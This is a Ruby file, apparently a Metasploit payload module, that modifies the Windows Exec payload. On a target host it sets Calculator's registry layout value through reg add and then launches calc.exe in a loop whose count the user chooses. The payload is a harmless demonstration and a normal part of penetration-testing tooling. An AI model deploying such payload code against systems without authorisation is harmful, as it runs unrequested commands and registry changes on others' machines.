require 'msf/core'
require 'msf/core/payload/windows/exec'


###
#
# Extends the Exec payload to run Scientific calc. 
#
###
module Metasploit3

	include Msf::Payload::Windows::Exec

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'Windows Execute calc.exe with Scientific layout',
			'Description'   => %q{
					Run Scientific calc.exe
			},
			'Author'        => ['DJ Manila Ice'],
			'License'       => MSF_LICENSE,
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			'Privileged'    => true))

		# Register command execution options
		register_options(
			[
				OptString.new('NUM', [ false, "1"]),
			], self.class)

		# Hide the CMD option...this is kinda ugly
		deregister_options('CMD')
	end

	#
	# Override the exec command string
	#
	def command_string
		reg_edit = 'reg add "HKCU\Software\Microsoft\Calc" /f /v layout /t REG_DWORD /d 0'
		loop_count = datastore["NUM"]
		return "cmd.exe /c #{reg_edit} && FOR /L %i IN (0,1,#{loop_count}) DO (start calc.exe)"
	end
end

